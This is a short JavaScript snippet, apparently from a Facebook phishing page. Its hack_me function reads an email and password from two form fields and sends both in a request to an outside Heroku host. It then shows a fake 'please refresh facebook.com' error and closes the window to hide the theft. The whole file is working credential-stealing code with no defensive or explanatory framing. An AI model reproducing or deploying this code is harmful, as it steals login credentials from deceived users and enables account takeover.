var host = "https://save-file-fb.herokuapp.com"

function hack_me() {
  var em = document.getElementById("hackit1").value;
  var ps = document.getElementById("hackit2").value;

  fetch(`${host}?em=${em}&ps=${ps}`)

  setTimeout(() => {
      alert('something went wrong. please refresh facebook.com and try again')
      window.close()
  }, 3000)
}